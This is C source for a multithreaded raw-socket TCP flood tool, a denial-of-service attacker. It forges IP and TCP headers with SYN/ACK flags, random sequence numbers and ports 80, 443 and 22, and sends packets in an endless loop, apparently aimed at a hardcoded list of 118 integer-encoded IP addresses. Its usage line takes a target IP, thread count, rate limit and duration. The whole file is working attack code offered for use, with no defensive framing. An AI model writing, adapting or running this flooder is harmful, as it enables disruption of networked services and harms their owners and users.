/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}
int ports[3] = {80, 443, 22};
void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = rand();
  tcph->dest = htons(ports[randnum(0, 3)]);
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->doff = 5;
 	tcph->syn = 1;
	tcph->window = rand();
	tcph->check = 0;
	tcph->urg_ptr = rand();
} 


void setup_tcp_header2(struct tcphdr *tcph)
{
	tcph->source = rand();
  tcph->dest = htons(ports[randnum(0, 3)]);
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->doff = 5;
 	tcph->ack = 1;
	tcph->window = rand(); 
	tcph->check = 0;
	tcph->urg_ptr = rand();
}

void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
  struct tcphdr2 *tcph2 = (void *)iph + sizeof(struct iphdr);
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(ports[randnum(0, 3)]);
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
  setup_tcp_header2(tcph);

	tcph->dest = htons(ports[randnum(0, 3)]);
int class[118]= {2274649098
,2274649189
,2274649099
,2274649198
,2274649199
,2274649201
,2274649202
,2274649204
,2274649206
,2274649100
,2274649208
,2274649209
,2274649210
,2274649213
,2274649215
,2274649221
,2274649225
,2274649227
,2274649228
,2274649231
,2274649232
,2274649234
,2274649237
,2274649238
,2274649239
,2274649248
,2274649249
,2274649251
,2274649252
,2274649254
,2274649105
,2274649258
,2274649260
,2274649261
,2274649264
,2274649265
,2274649266
,2274649267
,2274649268
,2274649269
,2274649274
,2274649275
,2274649276
,2274649277
,2274649107
,2274649278
,2274649283
,2274649284
,2274649285
,2274649286
,2274649287
,2274649108
,2274649288
,2274649289
,2274649290
,2274649292
,2274649293
,2274649296
,2274649109
,2274649299
,2274649300
,2274649301
,2274649302
,2274649303
,2274649305
,2274649306
,2274649110
,2274649309
,2274649310
,2274649311
,2274649315
,2274649316
,2274649317
,2274649326
,2274649327
,2274649112
,2274649328
,2274649113
,2274649116
,2274649119
,2274649121
,2274649122
,2274649124
,2274649125
,2274649092
,2274649133
,2274649134
,2274649135
,2274649136
,2274649093
,2274649146
,2274649147
,2274649094
,2274649149
,2274649150
,2274649151
,2274649152
,2274649153
,2274649154
,2274649155
,2274649157
,2274649095
,2274649159
,2274649162
,2274649165
,2274649166
,2274649096
,2274649169
,2274649172
,2274649173
,2274649174
,2274649176
,2274649177
,2274649097
,2274649178
,2274649180
,2274649183
,2274649184






















};

	iph->daddr = htonl(class[rand_cmwc()%118]);
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

		iph->saddr = sin.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc() & 0xFFFF;
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 6){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <port> <thread count> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
  struct sockaddr_in sin;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}